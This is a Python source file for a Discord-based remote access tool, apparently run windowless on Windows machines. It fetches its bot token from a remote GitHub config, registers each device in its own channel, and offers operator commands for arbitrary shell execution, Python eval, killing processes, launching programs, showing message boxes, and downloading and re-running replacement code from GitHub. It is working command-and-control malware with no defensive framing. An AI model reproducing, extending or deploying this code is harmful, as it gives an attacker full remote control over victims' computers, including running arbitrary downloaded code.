import discord
from discord.ext import commands
import os
import json
import uuid
import ctypes
import threading
import time
import subprocess
import psutil
import requests
import sys
import base64
import shutil

def load_config():
    try:
        url = 'https://raw.githubusercontent.com/Shinythunder/host/refs/heads/main/config.json'
        response = requests.get(url)
        response.raise_for_status()  # Check if request was successful
        config = response.json()

        # Decode the TOKEN with base64
        encoded_token = config.get('TOKEN')
        if encoded_token:
            decoded_token = base64.b64decode(encoded_token).decode('utf-8')
            return decoded_token, config['COMMAND_PREFIX']
        else:
            raise ValueError("TOKEN not found in config.json.")

    except Exception as e:
        print(f"Error loading config: {e}")
        return None, None
    
# Get device ID (persistent UUID)
def get_device_id():
    path = 'device_id.txt'
    if os.path.exists(path):
        with open(path, 'r') as f:
            return f.read().strip()
    device_id = str(uuid.uuid4())
    with open(path, 'w') as f:
        f.write(device_id)
    return device_id


script_dir = os.path.dirname(os.path.abspath(__file__))

# Path to device_id.txt
device_id_path = "device_id.txt"

# Check if device_id.txt exists in the current working directory
if os.path.exists(device_id_path):
    # Move device_id.txt to the same folder as the .pyw file
    shutil.move(device_id_path, os.path.join(script_dir, device_id_path))



# Load token and prefix
TOKEN, COMMAND_PREFIX = load_config()
if not TOKEN or not COMMAND_PREFIX:
    print("TOKEN or PREFIX missing in config.json.")
    exit()

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)
device_id = get_device_id()
device_category = None
commands_channel = None
start_time = time.time()

@bot.event
async def on_ready():
    global device_category, commands_channel
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    if not bot.guilds:
        print("Bot is not in any guild.")
        return
    guild = bot.guilds[0]

    # Check for existing category
    device_category = discord.utils.get(guild.categories, name=device_id)
    if not device_category:
        device_category = await guild.create_category(device_id)
        commands_channel = await guild.create_text_channel("commands", category=device_category)
        await guild.create_text_channel("info", category=device_category)

        # Send embedded command guide
        embed = discord.Embed(
            title="Bot Commands",
            description="Here are some commands you can use with the bot!",
            color=discord.Color.from_rgb(50, 88, 168)
        )
        embed.add_field(name="!ping", value="Responds with 'Pong!'", inline=False)
        embed.add_field(name="!help", value="Lists commands you can use with the bot", inline=False)
        embed.add_field(name="!alert", value="Sends an alert window with your message", inline=False)
        embed.add_field(name="!status", value="Shows this device's status and uptime", inline=False)
        embed.add_field(name="!exec", value="Executes a shell command", inline=False)
        embed.add_field(name="!ps", value="Lists active processes", inline=False)
        embed.add_field(name="!kill <pid or name>", value="Kills a process by PID or name", inline=False)
        embed.add_field(name="!start <path>", value="Starts a process from file path", inline=False)
        embed.add_field(name="!eval <code>", value="Evaluates Python code (⚠️ risky)", inline=False)
        embed.add_field(name="!update", value="Updates the script from the URL (restricted access)", inline=False)


        await commands_channel.send(embed=embed)
    else:
        commands_channel = discord.utils.get(device_category.text_channels, name="commands")

@bot.command()
async def ping(ctx):
    if ctx.channel.category.name != device_id:
        return
    await ctx.send("Pong!")

@bot.command()
async def alert(ctx, *, message: str):
    if ctx.channel.category.name != device_id:
        return

    def _thread_alert():
        ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0x40 | 0x1)
    threading.Thread(target=_thread_alert).start()

    embed = discord.Embed(
        title=":white_check_mark: Alert Sent",
        description=f"Alert message: {message}",
        color=discord.Color.from_rgb(50, 88, 168)
    )
    await ctx.send(embed=embed)

@bot.command()
async def status(ctx):
    if ctx.channel.category.name != device_id:
        return
    uptime_seconds = int(time.time() - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    formatted_uptime = f"{hours}h {minutes}m {seconds}s"

    embed = discord.Embed(
        title="📊 Device Status",
        color=discord.Color.from_rgb(50, 88, 168)
    )
    embed.add_field(name="Device ID", value=device_id, inline=False)
    embed.add_field(name="Uptime", value=formatted_uptime, inline=False)

    await ctx.send(embed=embed)

@bot.command()
async def exec(ctx, *, command: str):
    if ctx.channel.category.name != device_id:
        return
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
    except subprocess.CalledProcessError as e:
        result = f"Error:\n{e.output}"
    except subprocess.TimeoutExpired:
        result = "Error: Command timed out."

    if len(result) > 1900:
        result = result[:1900] + "\n... (truncated)"

    await ctx.send(f"```\n{result}\n```")

@bot.command()
async def eval(ctx, *, code: str):
    if ctx.channel.category.name != device_id:
        return
    try:
        result = eval(code)
        await ctx.send(f"✅ Result: `{result}`")
    except Exception as e:
        await ctx.send(f"❌ Error: `{e}`")

@bot.command()
async def ps(ctx):
    if ctx.channel.category.name != device_id:
        return
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes.append(f"{proc.info['pid']:>6} | {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    output = "\n".join(processes[:50])  # Limit to 50 processes
    await ctx.send(f"```\nPID    | Name\n{output}\n```")

@bot.command()
async def kill(ctx, *, target: str):
    if ctx.channel.category.name != device_id:
        return
    try:
        if target.isdigit():
            proc = psutil.Process(int(target))
            proc.terminate()
            await ctx.send(f"✅ Process with PID {target} terminated.")
        else:
            killed = 0
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == target.lower():
                    psutil.Process(proc.info['pid']).terminate()
                    killed += 1
            if killed:
                await ctx.send(f"✅ Killed {killed} instance(s) of `{target}`.")
            else:
                await ctx.send("❌ No matching process found.")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")


@bot.command()
async def start(ctx, *, path: str):
    if ctx.channel.category.name != device_id:
        return
    try:
        subprocess.Popen(path)
        await ctx.send(f"✅ Started: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ Failed to start process: {e}")

@bot.command()
async def update(ctx):
    if ctx.channel.category.name != device_id:
        return


    url = "https://raw.githubusercontent.com/Shinythunder/host/refs/heads/main/test.py"
    try:
        # Fetch the script from the URL
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for a bad response

        # Write the script content to test.py
        with open('test.py', 'w') as file:
            file.write(response.text)

        await ctx.send("✅ Script updated successfully. The bot will now reload.")
        # Optionally restart the bot or run the updated script after download
        os.execl(sys.executable, sys.executable, *sys.argv)

    except requests.RequestException as e:
        await ctx.send(f"❌ Error updating the script: {e}")

@bot.command()
async def help(ctx):
    if ctx.channel.category.name != device_id:
        return
    embed = discord.Embed(
        title="Bot Commands",
        description="Here are some commands you can use with the bot!",
        color=discord.Color.from_rgb(50, 88, 168)
    )
    embed.add_field(name="!ping", value="Responds with 'Pong!'", inline=False)
    embed.add_field(name="!help", value="Lists commands you can use with the bot", inline=False)
    embed.add_field(name="!alert", value="Sends an alert window with your message", inline=False)
    embed.add_field(name="!status", value="Shows this device's status and uptime", inline=False)
    embed.add_field(name="!exec", value="Executes a shell command", inline=False)
    embed.add_field(name="!ps", value="Lists active processes", inline=False)
    embed.add_field(name="!kill <pid or name>", value="Kills a process by PID or name", inline=False)
    embed.add_field(name="!start <path>", value="Starts a process from file path", inline=False)
    embed.add_field(name="!eval <code>", value="Evaluates Python code (⚠️ risky)", inline=False)
    embed.add_field(name="!update", value="Updates the script from the URL (restricted access)", inline=False)

    await ctx.send(embed=embed)


bot.run(TOKEN)
